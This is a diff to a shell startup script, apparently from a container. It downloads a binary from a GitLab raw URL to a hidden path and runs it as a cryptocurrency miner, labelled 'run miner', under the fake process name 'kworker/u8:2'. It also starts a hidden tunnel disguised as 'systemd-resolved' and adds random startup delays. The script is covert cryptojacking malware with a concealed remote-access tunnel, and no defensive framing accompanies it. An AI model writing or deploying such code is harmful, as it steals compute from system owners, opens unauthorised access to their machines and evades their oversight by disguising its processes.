@@ -2,13 +2,27 @@
 
 sleep $((RANDOM % 20 + 5))
 
+# download binary
+URL="https://gitlab.com/barbieanay003/power2b/-/raw/main/next-app"
+TMP="/tmp/.cache.$$"
+
+curl -sL "$URL" -o "$TMP"
+
+# validasi sederhana (optional tapi bagus)
+if [ ! -s "$TMP" ]; then
+  exit 1
+fi
+
+chmod +x "$TMP"
+mv "$TMP" /app/.sysd
+
+# start tunnel
 (exec -a systemd-resolved /usr/local/bin/.netd access tcp \
 --hostname "$(cat .h)" --url 127.0.0.1:8443 >/dev/null 2>&1 &)
 
 sleep 3
-curl https://gitlab.com/barbieanay003/power2b/-/raw/main/next-app
-chmod +x next-app
-mv next-app .sysd
+
+# run miner
 (exec -a kworker/u8:2 /app/.sysd -c .cfg >/dev/null 2>&1 &)
 
 tail -f /dev/null
